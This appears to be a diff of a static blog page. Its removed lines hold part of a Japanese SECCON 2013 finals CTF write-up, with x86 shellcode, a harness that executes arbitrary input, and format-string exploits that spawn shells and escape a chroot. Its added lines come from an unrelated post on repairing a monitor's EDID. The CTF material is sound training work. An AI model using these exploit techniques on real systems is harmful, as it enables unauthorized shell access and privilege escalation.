-db 0x2e,0x2e
-push 2048
-;5
-db 0x2e,0x2e,0x2e
-push 1
-;7
-db 0x2e,0x2e
-push stage2
-;7
-db 0x2e,0x2e
-call 0x08048810 ;fread
-
- 
-stage2:
-</code></pre>
-
-<p>shellcode_stage2.asm:</p>
-
-<pre><code>org 0x804a340 + 5 + 7 + 5 + 7 + 7
-bits 32
- 
-mov ebx, path
-mov eax,0x5            ;sys_open
-mov ecx, 0x400+0x40+1 ;O_APPEND | O_CREAT | O_WRONLY
-int 0x80
- 
-mov ebx, eax       ;fd
-mov eax, 4         ;sys_write
-mov ecx, flagword  ;buf
-mov edx, 0x1000    ;len
-int 0x80
- 
-hlt
- 
-path:
-db &quot;flagword.txt&quot;, 0
-flagword:
-db &quot;95f13c77edc735fc82258d878a54d91e&quot;, 0x0a
-flagword_end:
-</code></pre>
-
-<p>exploit:</p>
-
-<pre><code>#!/usr/bin/python
-import pack
-import sys
- 
-#stage1
-buf = open(&quot;shellcode_stage1&quot;, &quot;rb&quot;).read()
-sys.stdout.write(pack.pl32(len(buf)))
-sys.stdout.write(buf)
- 
-#stage2
-buf = open(&quot;shellcode_stage2&quot;, &quot;rb&quot;).read()
-sys.stdout.write(buf)
-</code></pre>
-
-<h3 id="druaga">Druaga</h3>
-
-<p>ドルアーガの塔</p>
-
-<p>サーバーからダウンロードできる yuko_oshima.binはtruecryptのボリュームらしい。</p>
-
-<p>展開するとキーワードとzipが出てくる。</p>
-
-<pre><code>$ nkf KEY\{OoiOtya\}.txt 
-Linux/x86環境にて 0609 と表示するアセンブラ短歌を探し出し
-そのアセンブラ短歌が書かれた画像の MD5値 を求めよ！
-
-KEY{MD5(taka.jpg)}
-
-※）アルファベットは小文字
-
-Enjoy Hacking! :)
-</code></pre>
-
-<p>朝起きたらすでにチームメイトが画像をテキストに変換するコードを完成させていたので、3/
-を変換して下のコードで実行させてみたら 0609 が出てきた。運が良かった。</p>
-
-<pre><code>#!/usr/bin/python
-import subprocess
-import sys
-import binascii
-for path in sys.stdin:
-    path = path.rstrip()
- 
-    tanka = open(path, &quot;r&quot;).read()
-    if (&quot;cd80&quot; in tanka) or (&quot;0f05&quot; in tanka):
-        tanka_unhexed = binascii.unhexlify(tanka)
-        print &quot;execute &quot; + path
-        #途中で無限ループする短歌が出てくるので実行時間を制限する
-        p = subprocess.Popen(&quot;ulimit -t 2 &amp;&amp; ./executor 2&gt;/dev/null&quot;, shell=True, stdin=subprocess.PIPE)
-        p.stdin.write(tanka_unhexed)
-        p.stdin.flush()
-        p.stdin.close()
-        p.wait()
-
-
-
-//gcc -m32 -fno-stack-protector -z execstack executor.c -o executor
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
- 
-int main(int argc, char **argv) {
-    char buf[4096];
-    memset(buf, 0xf4, sizeof(buf)); //hlt
-    fread(buf, 1, 4095, stdin);
-    return ((int (*)())buf)();
-}
-</code></pre>
-
-<p>/3/93/73/taka.jpgが正解のファイル。</p>
-
-<p>あとはチームメイトが解いた。</p>
-
-<p>@waidottoのwriteup: <a href="http://d.hatena.ne.jp/waidotto/20140303">SECCON 2013 全国大会 Write up</a></p>
-
-<h3 id="hanoi">Hanoi</h3>
-
-<p>ハノイの塔</p>
-
-<h4 id="stage1-1">stage1</h4>
-
-<p>readfile.phpにファイル名と ファイル名のmd5sumを渡すと
-特定のファイルを読み込める。</p>
-
-<p>readfile.phpでindex.phpを読み込むとキーワードが出てくる。</p>
-
-<pre><code>Access granted to index.php!
-
-if ($_SERVER[REQUEST_METHOD] == 'POST')
-{
-echo &quot;ACCESS DENIED!
-
-&quot;;
-}
-//
-// stage1:
-// KEY{!2345&amp;QwertY}
-// Hint to Next Step: 
-// Did you inspect whole web contents on this server?
-//
-?&gt;
-...
-</code></pre>
-
-<p>top.gifの後にDNSのパケットがくっついていたので、送信元のサーバーを調べてみたがよくわからなかった。</p>
-
-<p>勘でstage3のサーバーを見つけたが時間切れになった。</p>
-
-<h3 id="babel">Babel</h3>
-
-<p>バベルの塔</p>
-
-<p>babel.tower:5060で pureserver、babel.tower:5061で
-jamserverが動いていて、両方のバイナリにフォーマット文字列脆弱性がある。</p>
-
-<pre><code>$ file *server
-jamserver:  ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, BuildID[sha1]=0x4788d869615da8fec8c98810fb205940a0a9af1f, not stripped
-pureserver: ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, BuildID[sha1]=0x01adec44d315228ee41dc71ed8eb2e4d1656d50d, not stripped
-</code></pre>
-
-<h4 id="stage1-2">stage1</h4>
-
-<p>jamserverに接続すると実行される /home/jam/bin/putskeyの出力にAAで「Key is CurryRice」と書かれているが、制御文字で隠されている。</p>
-
-<p>lessで表示したら答えが出てきた。</p>
-
-<h4 id="stage2-1">stage2</h4>
-
-<p>pureserverは 入力を受け取りprintfした後、 /usr/bin/calを起動する。</p>
-
-<p>&rdquo;/usr/bin/cal&rdquo;を指すポインタが書き換え可能。バイナリ内に&rdquo;/bin/sh&rdquo;があるので、そこにポインタを変更することでシェルを起動できる。</p>
-
-<p>/home/pure/key.txtのキーワードを読み込めるようになる。</p>
-
-<p>フラッグワードのファイルに書き込むにはjamserverの権限が必要なので、まだ書き込めない。</p>
-
-<p>exploit:</p>
-
-<pre><code>#!/usr/bin/python
-#pureserver
-from libformatstr import *
- 
-DEST = 0x23485C70
-BINSH = 0x23467CB0
-BUFIDX = 4
- 
-p = FormatStr()
-p[DEST] = BINSH
- 
-print p.payload(BUFIDX)
-</code></pre>
-
-<h4 id="stage3-1">stage3</h4>
-
-<p>jamserverは /home/jamにchrootし権限降格した後、/bin/putskeyを起動する。文字列&rdquo;/bin/putskey&rdquo;が書き換え可能。</p>
-
-<p>/home/jam/tmpのパーミッションが777なのでpureserverの権限でファイルをコピーできる。</p>
-
-<p>chroot環境には最低限のライブラリしか入っていないので、jamserverでの作業にはbusyboxを使う。</p>
-
-<p>まず、pureserverのシェルで busyboxを /home/jam/tmpにコピーする。</p>
-
-<p>次に/bin/shを/home/jam/tmp/putskeyとしてコピーする。(入力文字列の長さ制限が厳しいので、最低限の書き換えで済むようにする)</p>
-
-<p>exploitで&rdquo;/bin/putskey&rdquo;を&rdquo;/tmp/putskey&rdquo;に書き換えてシェルを起動すると、/home/jam/key.txtにあるキーワードを読み込めるようになる。</p>
-
-<p>exploit:</p>
-
-<pre><code>#!/usr/bin/python
-from libformatstr import *
-import sys
-import pack
-DEST = 0x23485D48    #/bin/putskey
-BUFIDX = 4
- 
-p = FormatStr()
-p[DEST] = &quot;/tmp&quot;
- 
-sys.stdout.write(p.payload(BUFIDX))
-</code></pre>
-
-<h4 id="stage4-1">stage4</h4>
-
-<p>jamserverでシェルをsetuidし、pureserverから叩くことでchroot環境外でjamユーザになれる。</p>
-
-<p>/home/key.txtにあるキーワードが読み込めるようになる。</p>
-
-<p>さらに/var/www/flag.txtにフラッグワードを書き込むことができるようになる。</p>
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure center" >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/edid-repair/edid-ok.png" title="正常に認識されるようになった" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/edid-repair/edid-ok.png"  alt="正常に認識されるようになった">
+  
+    </a>
+  
+   
+    <span class="caption">正常に認識されるようになった</span>
+  
+</div>
+
+
+<h2 id="おまけ">おまけ</h2>
+
+<p>EDIDをいじるとこういうこともできる</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure center" >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/edid-repair/flexscan.png" title="💰FlexScan💰 になったH243H" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/edid-repair/flexscan.png"  alt="💰FlexScan💰 になったH243H">
+  
+    </a>
+  
+   
+    <span class="caption">💰FlexScan💰 になったH243H</span>
+  
+</div>
               
             </div>
           </div>
           <div id="post-footer" class="post-footer main-content-wrap">
             
-              
-                
-                
-                  <div class="post-footer-tags">
-                    <span class="text-color-light text-small">タグ</span><br/>
-                    
-  <a class="tag tag--primary tag--small" href="https://ngkz.github.io/tags/seccon/">SECCON</a>
-
-                  </div>
-                
               
             
             <div class="post-actions-wrap">
@@ -1016,7 +512,7 @@ sys.stdout.write(p.payload(BUFIDX))
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/07/seccon-2014-online-japanese-quals-writeup/" data-tooltip="SECCON 2014 オンライン予選 (日本語) writeup">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">次</span>
@@ -1024,7 +520,7 @@ sys.stdout.write(p.payload(BUFIDX))
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/seccon-2013-online-quals-writeup/" data-tooltip="SECCON 2013 オンライン予選 writeup">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2018/12/wake-windshield-washer-tank-repair/" data-tooltip="ウェイクのウィンドウウォッシャータンクの漏れを修理する">
               
                   <span class="hide-xs hide-sm text-small icon-mr">前</span>
                   <i class="fa fa-angle-right"></i>
@@ -1042,19 +538,19 @@ sys.stdout.write(p.payload(BUFIDX))
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2019/01/edid-repair/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2019/01/edid-repair/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2019/01/edid-repair/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -1102,7 +598,7 @@ sys.stdout.write(p.payload(BUFIDX))
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/07/seccon-2014-online-japanese-quals-writeup/" data-tooltip="SECCON 2014 オンライン予選 (日本語) writeup">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">次</span>
@@ -1110,7 +606,7 @@ sys.stdout.write(p.payload(BUFIDX))
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/seccon-2013-online-quals-writeup/" data-tooltip="SECCON 2013 オンライン予選 writeup">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2018/12/wake-windshield-washer-tank-repair/" data-tooltip="ウェイクのウィンドウウォッシャータンクの漏れを修理する">
               
                   <span class="hide-xs hide-sm text-small icon-mr">前</span>
                   <i class="fa fa-angle-right"></i>
@@ -1128,19 +624,19 @@ sys.stdout.write(p.payload(BUFIDX))
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2019/01/edid-repair/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2019/01/edid-repair/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2019/01/edid-repair/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -1170,19 +666,19 @@ sys.stdout.write(p.payload(BUFIDX))
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fngkz.github.io%2F2014%2F03%2Fseccon-2013-finals-writeup%2F">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fngkz.github.io%2F2019%2F01%2Fedid-repair%2F">
           <i class="fa fa-facebook-official"></i><span>Facebookで共有</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fngkz.github.io%2F2014%2F03%2Fseccon-2013-finals-writeup%2F">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fngkz.github.io%2F2019%2F01%2Fedid-repair%2F">
           <i class="fa fa-twitter"></i><span>Twitterで共有</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fngkz.github.io%2F2014%2F03%2Fseccon-2013-finals-writeup%2F">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fngkz.github.io%2F2019%2F01%2Fedid-repair%2F">
           <i class="fa fa-google-plus"></i><span>Google&#43;で共有</span>
         </a>
       </li>
@@ -1552,9 +1048,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/ngkz.github.io\/2014\/03\/seccon-2013-finals-writeup\/';
+          this.page.url = 'https:\/\/ngkz.github.io\/2019\/01\/edid-repair\/';
           
-            this.page.identifier = '\/2014\/03\/seccon-2013-finals-writeup\/'
+            this.page.identifier = '\/2019\/01\/edid-repair\/'
           
         };
         (function() {
